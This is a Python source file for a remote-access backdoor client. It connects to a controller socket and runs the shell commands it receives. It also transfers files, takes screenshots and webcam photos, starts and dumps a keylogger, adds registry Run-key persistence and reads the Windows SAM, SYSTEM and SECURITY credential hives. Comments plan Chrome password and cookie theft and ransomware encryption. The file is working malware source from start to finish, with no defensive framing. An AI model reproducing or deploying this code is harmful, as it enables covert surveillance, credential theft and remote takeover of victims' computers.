# Standard library imports
import ctypes
import cv2
import json
import os
import shutil
import socket
import ssl
import subprocess
import sys
import threading
import time
from sys import platform

# Related third party imports
import requests
from mss import mss

# Local application/library specific imports
import keylogger
# from mss import mss # mss v6.1.0
# import requests # v2.28.0


def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(2)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()


def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())
    f.close()


def download_url(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as out_file:
        out_file.write(get_response.content)


def screenshot():
    if platform == "win32" or platform == "darwin":
        with mss() as screen:
            filename = screen.shot()
            os.rename(filename, '.screen.png')
    elif platform == "linux" or platform == "linux2":
        with mss(display=":0.0") as screen:
            filename = screen.shot()
            os.rename(filename, '.screen.png')

# TODO: screenshot other monitors


# TODO: SAM - this code is untested
def get_sam_dump():
    if not is_admin():
        return "You must run this function as an Administrator."
    
    SAM = r'C:\Windows\System32\config\SAM'
    SYSTEM = r'C:\Windows\System32\config\SYSTEM'
    SECURITY = r'C:\Windows\System32\config\SECURITY'
    
    try:
        sam_file = open(SAM, 'rb')
        system_file = open(SYSTEM, 'rb')
        security_file = open(SECURITY, 'rb')
        
        sam_data = sam_file.read()
        system_data = system_file.read()
        security_data = security_file.read()
        
        sam_file.close()
        system_file.close()
        security_file.close()
        
        return sam_data, system_data, security_data
    except PermissionError:
        return "Insufficient permissions to access SAM, SYSTEM, or SECURITY files."
    except FileNotFoundError:
        return "SAM, SYSTEM, or SECURITY file not found. Please check the file paths."
    except Exception as e:
        return f"An unexpected error occurred: {str(e)}"



def capture_webcam():
    webcam = cv2.VideoCapture(0)
    webcam.set(cv2.CAP_PROP_EXPOSURE, 40)

    # Check if the webcam is available
    if not webcam.isOpened():
        print("No webcam available")
        return
    
    ret, frame = webcam.read()

    # Check if the webcam was able to capture a frame
    if not ret:
        print("Failed to read frame from webcam")
        return

    webcam.release()

    # Save the frame to a file
    if platform == "win32" or platform == "darwin" or platform == "linux" or platform == "linux2":
        is_success, im_buf_arr = cv2.imencode(".webcam.png", frame)
        if is_success:
            with open('.webcam.png', 'wb') as f:
                f.write(im_buf_arr.tobytes())
        else:
            print("Failed to save webcam image")


# TODO rename from persist to `reg_persist`
def persist(reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call(
                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"',
                shell=True)
            reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
        else:
            reliable_send('[+] Persistence Already Exists')
    except:
        reliable_send('[-] Error Creating Persistence With The Target Machine')


def startup_persist(file_name):
    pass
    # TODO create persistence in startup folder


def is_admin():
    global admin
    if platform == 'win32':
        try:
            temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
        except:
            admin = '[!!] User Privileges!'
        else:
            admin = '[+] Administrator Privileges!'
    elif platform == "linux" or platform == "linux2" or platform == "darwin":
        pass
        # TODO implmenet checking if these platforms have root/admin access


# TODO: more elegant but relibles on an additional library
# def is_admin():
#     try:
#         return ctypes.windll.shell32.IsUserAnAdmin()
#     except:
#         return False


# def is_admin():
#     global admin
#     if platform == 'win32':
#         try:
#             temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
#         except:
#             admin = False
#         else:
#             admin = True
#     elif platform == "linux" or platform == "linux2" or platform == "darwin":
#         os.open('/etc/hosts', os.O_RDONLY)
#         admin = True
#         # TODO implmenet checking if these platforms have root/admin access
#     return admin


# def admin_string(is_admin):
#     if(is_admin):
#         return '[+] Administrator Privileges!'
#     else:
#         return '[!!] User Privileges!'


# TODO get_chrome_passwords()

# TODO get_chrome_cookies()

# TODO encrypt_user_dir() ransomware element
# TODO def encrypt_file_in_dir(file_name, key)
# TODO def gen_key()
# TODO def send_key(file_name, key)

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'background' or command == 'bg':  # BEGIN
            pass
        elif command == 'help':  # ideally to be removed
            pass
        elif command == 'clear':
            pass  # END
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
            # try:
            #     os.chdir(command[3:])
            #     reliable_send('[+] Changed working dir to ' + os.getcwd())
            # except Exception as e:
            #     reliable_send('[-] ' + str(e))
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:3] == 'get':
            try:
                download_url(command[4:])
                reliable_send('[+] Downloaded File From Specified URL!')
            except:
                reliable_send('[!!] Download Failed!')
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file('.screen.png')
            os.remove('.screen.png')
        elif command[:6] == 'webcam':
            capture_webcam()
            upload_file('.webcam.png')
            os.remove('.webcam.png')
        elif command[:12] == 'keylog_start':
            keylog = keylogger.Keylogger()
            t = threading.Thread(target=keylog.start)
            t.start()
            reliable_send('[+] Keylogger Started!')
        elif command[:11] == 'keylog_dump':
            logs = keylog.read_logs()
            reliable_send(logs)
        elif command[:11] == 'keylog_stop':
            keylog.self_destruct()
            t.join()
            reliable_send('[+] Keylogger Stopped!')
        elif command[:11] == 'persistence':
            reg_name, copy_name = command[12:].split(' ')
            persist(reg_name, copy_name)
        elif command[:7] == 'sendall':
            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                             stdin=subprocess.PIPE)
        elif command[:5] == 'check':
            try:
                is_admin()
                reliable_send(admin + ' platform: ' + platform)
            except:
                reliable_send('Cannot Perform Privilege Check! Platform: ' + platform)
        elif command[:5] == 'start':
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send('[+] Started!')
            except:
                reliable_send('[-] Failed to start!')
        # TODO: This code is untested!
        elif command[:12] == 'get_sam_dump':
            sam_dump, system_dump, security_dump = get_sam_dump()
            reliable_send((sam_dump, system_dump, security_dump))
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)


def connection():
    while True:
        time.sleep(1)
        try:
            s.connect(('127.0.0.1', 5555))
            # if platform == 'win32':       #TO BE DONE
            #     persist('Backdoor', 'windows32.exe')
            shell()
            s.close()
            break
        except:
            connection()


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
